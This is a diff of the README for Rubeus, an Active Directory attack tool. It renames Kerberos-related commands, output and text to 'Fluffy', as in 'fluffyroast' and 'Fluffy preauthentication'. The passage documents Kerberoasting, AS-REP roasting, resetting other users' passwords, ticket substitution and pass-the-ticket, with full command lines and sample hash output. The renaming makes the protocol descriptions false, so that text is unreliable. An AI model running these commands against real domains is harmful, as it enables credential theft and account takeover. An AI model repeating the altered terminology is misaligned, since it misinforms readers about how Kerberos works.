-    C:\Rubeus>Rubeus.exe kerberoast /ou:OU=TestingOU,DC=testlab,DC=local /outfile:C:\Temp\hashes.txt
+    C:\Rubeus>Rubeus.exe fluffyroast /ou:OU=TestingOU,DC=testlab,DC=local /outfile:C:\Temp\hashes.txt
 
      ______        _
     (_____ \      | |
@@ -3188,7 +3188,7 @@ Kerberoasting all users in a specific OU, saving the hashes to an output file:
     v1.3.4
 
 
-    [*] Action: Kerberoasting
+    [*] Action: Fluffyroasting
 
     [*] Target OU              : OU=TestingOU,DC=testlab,DC=local
 
@@ -3200,9 +3200,9 @@ Kerberoasting all users in a specific OU, saving the hashes to an output file:
     [*] Roasted hashes written to : C:\Temp\hashes.txt
 
 
-Perform Kerberoasting using the `tgtdeleg` trick to get a usable TGT, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 3 service tickets:
+Perform Fluffyroasting using the `tgtdeleg` trick to get a usable TGT, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 3 service tickets:
 
-    C:\Rubeus>Rubeus.exe kerberoast /tgtdeleg /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:3
+    C:\Rubeus>Rubeus.exe fluffyroast /tgtdeleg /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:3
 
        ______        _
       (_____ \      | |
@@ -3214,15 +3214,15 @@ Perform Kerberoasting using the `tgtdeleg` trick to get a usable TGT, requesting
       v1.5.0
 
 
-    [*] Action: Kerberoasting
+    [*] Action: Fluffyroasting
 
     [*] Using 'tgtdeleg' to request a TGT for the current user
     [*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
-    [*] Searching the current domain for Kerberoastable users
+    [*] Searching the current domain for Fluffyroastable users
     [*] Searching for accounts with lastpwdset from 01-31-2005 to 03-29-2010
     [*] Up to 3 result(s) will be returned
 
-    [*] Total kerberoastable users : 3
+    [*] Total fluffyroastable users : 3
 
 
     [*] SamAccountName         : harmj0y
@@ -3249,9 +3249,9 @@ Perform Kerberoasting using the `tgtdeleg` trick to get a usable TGT, requesting
     [*] Hash                   : $krb5tgs$23$*newuser$theshire.local$blah/blah123456*$C4561559C2A7DF07712...(snip)...
 
 
-List statistics about found Kerberoastable accounts without actually sending ticket requests:
+List statistics about found Fluffyroastable accounts without actually sending ticket requests:
 
-    C:\Rubeus>Rubeus.exe kerberoast /stats
+    C:\Rubeus>Rubeus.exe fluffyroast /stats
 
        ______        _
       (_____ \      | |
@@ -3263,12 +3263,12 @@ List statistics about found Kerberoastable accounts without actually sending tic
       v1.5.0
 
 
-    [*] Action: Kerberoasting
+    [*] Action: Fluffyroasting
 
     [*] Listing statistics about target users, no ticket requests being performed.
-    [*] Searching the current domain for Kerberoastable users
+    [*] Searching the current domain for Fluffyroastable users
 
-    [*] Total kerberoastable users : 4
+    [*] Total fluffyroastable users : 4
 
 
      ----------------------------------------------------------------------
@@ -3287,9 +3287,9 @@ List statistics about found Kerberoastable accounts without actually sending tic
      ----------------------------------
 
 
-Kerberoasting a specific user, with simplified hash output:
+Fluffyroasting a specific user, with simplified hash output:
 
-    C:\Rubeus>Rubeus.exe kerberoast /user:harmj0y /simple
+    C:\Rubeus>Rubeus.exe fluffyroast /user:harmj0y /simple
 
        ______        _
       (_____ \      | |
@@ -3301,22 +3301,22 @@ Kerberoasting a specific user, with simplified hash output:
       v1.5.0
 
 
-    [*] Action: Kerberoasting
+    [*] Action: Fluffyroasting
 
     [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
     [*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
 
     [*] Target User            : harmj0y
-    [*] Searching the current domain for Kerberoastable users
+    [*] Searching the current domain for Fluffyroastable users
 
-    [*] Total kerberoastable users : 1
+    [*] Total fluffyroastable users : 1
 
     $krb5tgs$18$*harmj0y$theshire.local$testspn/server*$F63783C58AA153F24DFCC796A120C55C$06C6929374A2D3...(snip)...
 
 
-Kerberoasting all users in a foreign _trusting_ domain, not line-wrapping the results:
+Fluffyroasting all users in a foreign _trusting_ domain, not line-wrapping the results:
 
-    C:\Rubeus>Rubeus.exe kerberoast /domain:dev.testlab.local /nowrap
+    C:\Rubeus>Rubeus.exe fluffyroast /domain:dev.testlab.local /nowrap
 
      ______        _
     (_____ \      | |
@@ -3328,7 +3328,7 @@ Kerberoasting all users in a foreign _trusting_ domain, not line-wrapping the re
     v1.5.0
 
 
-    [*] Action: Kerberoasting
+    [*] Action: Fluffyroasting
 
     [*] Target Domain          : dev.testlab.local
 
@@ -3338,9 +3338,9 @@ Kerberoasting all users in a foreign _trusting_ domain, not line-wrapping the re
     [*] Hash                   : $krb5tgs$23$*$dev.testlab.local$test/test@dev.testlab.local*$969339A82...(snip)...
 
 
-Kerberoasting using an existing TGT:
+Fluffyroasting using an existing TGT:
 
-    C:\Rubeus>Rubeus.exe kerberoast /ticket:doIFujCCBbagAwIBBaEDAgEWoo...(snip)... /spn:"asdf/asdfasdf" /dc:primary.testlab.local
+    C:\Rubeus>Rubeus.exe fluffyroast /ticket:doIFujCCBbagAwIBBaEDAgEWoo...(snip)... /spn:"asdf/asdfasdf" /dc:primary.testlab.local
 
      ______        _
     (_____ \      | |
@@ -3352,7 +3352,7 @@ Kerberoasting using an existing TGT:
     v1.3.5
 
 
-    [*] Action: Kerberoasting
+    [*] Action: Fluffyroasting
 
     [*] Using a TGT /ticket to request service tickets
 
@@ -3360,9 +3360,9 @@ Kerberoasting using an existing TGT:
     [*] Hash                   : $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$4EFF99FDED690AB4616EB...(snip)...
 
 
-"Opsec" Kerberoasting, using the **tgtdeleg** trick, filtering out AES-enabled accounts:
+"Opsec" Fluffyroasting, using the **tgtdeleg** trick, filtering out AES-enabled accounts:
 
-    C:\Rubeus>Rubeus.exe kerberoast /rc4opsec
+    C:\Rubeus>Rubeus.exe fluffyroast /rc4opsec
 
      ______        _
     (_____ \      | |
@@ -3374,13 +3374,13 @@ Kerberoasting using an existing TGT:
     v1.3.6
 
 
-    [*] Action: Kerberoasting
+    [*] Action: Fluffyroasting
 
     [*] Using 'tgtdeleg' to request a TGT for the current user
-    [*] Searching the current domain for Kerberoastable users
+    [*] Searching the current domain for Fluffyroastable users
     [*] Searching for accounts that only support RC4_HMAC, no AES
 
-    [*] Found 6 users to Kerberoast!
+    [*] Found 6 users to Fluffyroast!
 
     [*] SamAccountName         : harmj0y
     [*] DistinguishedName      : CN=harmj0y,CN=Users,DC=testlab,DC=local
@@ -3391,13 +3391,13 @@ Kerberoasting using an existing TGT:
 
 ### asreproast
 
-The **asreproast** action replaces the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast/) project which executed similar actions with the (larger sized) [BouncyCastle](https://www.bouncycastle.org/) library. If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting. For more technical information, [see this post](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/).
+The **asreproast** action replaces the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast/) project which executed similar actions with the (larger sized) [BouncyCastle](https://www.bouncycastle.org/) library. If a domain user does not have Fluffy preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la fluffyroasting. For more technical information, [see this post](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/).
 
-Just as with the [kerberoast](#kerberoast) command, if no other arguments are supplied, all user accounts not requiring with Kerberos preauth not required are roasted. The `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.
+Just as with the [fluffyroast](#fluffyroast) command, if no other arguments are supplied, all user accounts not requiring with Fluffy preauth not required are roasted. The `/user:X` argument roasts just the specified user, and the `/ou:X` argument roasts just users in the specific OU. The `/domain` and `/dc` arguments are optional, pulling system defaults as other actions do.
 
 The `/outfile:FILE` argument outputs roasted hashes to the specified file, one per line.
 
-Also, if you wanted to use alternate domain credentials for kerberoasting, that can be specified with `/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`.
+Also, if you wanted to use alternate domain credentials for fluffyroasting, that can be specified with `/creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD`.
 
 The output `/format:X` defaults to John the Ripper ([Jumbo version](https://github.com/magnumripper/JohnTheRipper)). `/format:hashcat` is also an option for the new hashcat mode 18200.
 
@@ -3593,8 +3593,8 @@ Breakdown of the miscellaneous commands:
 | Command     | Description |
 | ----------- | ----------- |
 | [createnetonly](#createnetonly) | Create a process of logon type 9 |
-| [changepw](#changepw) | Perform the Aorato Kerberos password reset |
-| [hash](#hash) | Hash a plaintext password to Kerberos encryption keys |
+| [changepw](#changepw) | Perform the Aorato Fluffy password reset |
+| [hash](#hash) | Hash a plaintext password to Fluffy encryption keys |
 | [tgssub](#tgssub) | Substitute in alternate service names into a service ticket |
 | [currentluid](#currentluid) | Display the current user's LUID |
 | [logonsession](#logonsession) | Display logon session information |
@@ -3604,7 +3604,7 @@ Breakdown of the miscellaneous commands:
 
 ### createnetonly
 
-The **createnetonly** action will use the CreateProcessWithLogonW() API to create a new hidden (unless `/show` is specified) process with a SECURITY_LOGON_TYPE of 9 (NewCredentials), the equivalent of runas /netonly. The process ID and LUID (logon session ID) are returned. This process can then be used to apply specific Kerberos tickets to with the [ptt /luid:0xA..](#ptt) parameter, assuming elevation. This prevents the erasure of existing TGTs for the current logon session.
+The **createnetonly** action will use the CreateProcessWithLogonW() API to create a new hidden (unless `/show` is specified) process with a SECURITY_LOGON_TYPE of 9 (NewCredentials), the equivalent of runas /netonly. The process ID and LUID (logon session ID) are returned. This process can then be used to apply specific Fluffy tickets to with the [ptt /luid:0xA..](#ptt) parameter, assuming elevation. This prevents the erasure of existing TGTs for the current logon session.
 
 Create a hidden upnpcont.exe process:
 
@@ -3674,7 +3674,7 @@ Create a visible command prompt and import a ticket:
 
 ### changepw
 
-The **changepw** action will take a user's TGT .kirbi blog and execute a MS kpasswd password change with the specified `/new:PASSWORD` value. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the password reset traffic. This is the Aorato Kerberos password reset disclosed in 2014, and is equivalent to Kekeo's **misc::changepw** function.
+The **changepw** action will take a user's TGT .kirbi blog and execute a MS kpasswd password change with the specified `/new:PASSWORD` value. If a `/dc` is not specified, the computer's current domain controller is extracted and used as the destination for the password reset traffic. This is the Aorato Fluffy password reset disclosed in 2014, and is equivalent to Kekeo's **misc::changepw** function.
 
 The `/targetuser` argument can be used to change the password of other users, given the user whose TGT it is has enough privileges. The format required is **domain.com\user**.
 
@@ -3734,7 +3734,7 @@ Changing the password of another user (**dev.ccob@dev.rubeus.ghostpack.local**) 
 
 ### hash
 
-The **hash** action will take a `/password:X` and optional `/user:USER` and/or `/domain:DOMAIN`. It will generate the rc4_hmac (NTLM) representation of the password using @gentilkiwi's **kerberos:hash** (KERB_ECRYPT HashPassword) approach. If user and domain names are specified, the aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hash forms are generated. The user and domain names are used as salts for the AES and DES implementations.
+The **hash** action will take a `/password:X` and optional `/user:USER` and/or `/domain:DOMAIN`. It will generate the rc4_hmac (NTLM) representation of the password using @gentilkiwi's **fluffy:hash** (KERB_ECRYPT HashPassword) approach. If user and domain names are specified, the aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hash forms are generated. The user and domain names are used as salts for the AES and DES implementations.
 
 Calculating the rc4_hmac of a password:
 
@@ -3791,7 +3791,7 @@ The `/altservice:X` argument is required and can either be a standalone sname (l
 
 The `/srealm:Y` argument is optional and can be used to change the service realm within the ticket.
 
-The `/ptt` flag will "pass-the-ticket" and apply the resulting Kerberos credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.
+The `/ptt` flag will "pass-the-ticket" and apply the resulting Fluffy credential to the current logon session. The `/luid:0xA..` flag will apply the ticket to the specified logon session ID (elevation needed) instead of the current logon session.
 
 Executing the S4U2self/S4U2proxy proces to abuse traditional constrained delegation, and replacing the sname in the final ticket. This is so you don't have to execute the S4U process for a second time:
 
@@ -3911,7 +3911,7 @@ Executing the S4U2self/S4U2proxy proces to abuse traditional constrained delegat
 
 
 
-    [*] Action: List Kerberos Tickets (Current User)
+    [*] Action: List Fluffy Tickets (Current User)
 
     [*] Current LUID    : 0x6de14
 
@@ -4108,7 +4108,7 @@ The **logonsession** action will display information about the current context's
         UserName      : harmj0y
         LogonDomain   : THESHIRE
         SID           : S-1-5-21-937929760-3187473010-80948926-1104
-        AuthPackage   : Kerberos
+        AuthPackage   : Fluffy
         LogonType     : Interactive (2)
         Session       : 1
         LogonTime     : 6/9/2022 1:17:48 PM
@@ -4150,7 +4150,7 @@ To build Rubeus as a library, under **Project** -> **Rubeus Properties** -> chan
     Rubeus.Program.Main("dump /luid:3050142".Split());
 
     // or invoke specific functionality manually
-    Rubeus.LSA.ListKerberosTicketDataAllUsers(new Rubeus.Interop.LUID());
+    Rubeus.LSA.ListFluffyTicketDataAllUsers(new Rubeus.Interop.LUID());
 
 
 You can then use [ILMerge](https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=17630) to merge the Rubeus.dll into your resulting project assembly for a single, self-contained file.
